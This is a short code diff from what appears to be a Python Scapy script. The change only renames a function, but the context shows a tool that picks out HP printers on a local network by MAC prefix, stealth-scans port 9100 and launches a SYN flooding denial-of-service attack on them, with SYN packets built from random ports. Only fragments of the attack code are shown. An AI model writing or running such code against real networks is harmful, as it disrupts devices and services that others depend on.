@@ -12,7 +12,7 @@ def main():
 		#preferm stealth scan on port 9100 to see if this is a printer (9100 used for raw printing)
 		if preferm_stealth_scan(printer_possible_ip,RAW_PRINTING_PORT) == True:
 		#start dos attack (SYN Flooding Attack)
-			dos_SYN_Flooding_Attack(printer_possible_ip)
+			dos_syn_flooding_attack(printer_possible_ip)
 			
 			
 #function to filter frames by the first half of the destination mac address(that determine that this is an hp #device -> 9C:7B:EF)
@@ -32,8 +32,8 @@ def preferm_stealth_scan(hp_device_ip,hp_device_port):
         	return True
         
         return False
-        
-def dos_SYN_Flooding_Attack(dst_ip):
+       
+def dos_syn_flooding_attack(dst_ip):
 	hp_ip = IP(dst=dst_ip)
         #set src address to a random IP address in the private network range 
         hp_tcp = TCP(sport=RandShort(), dport=80, flags="S")
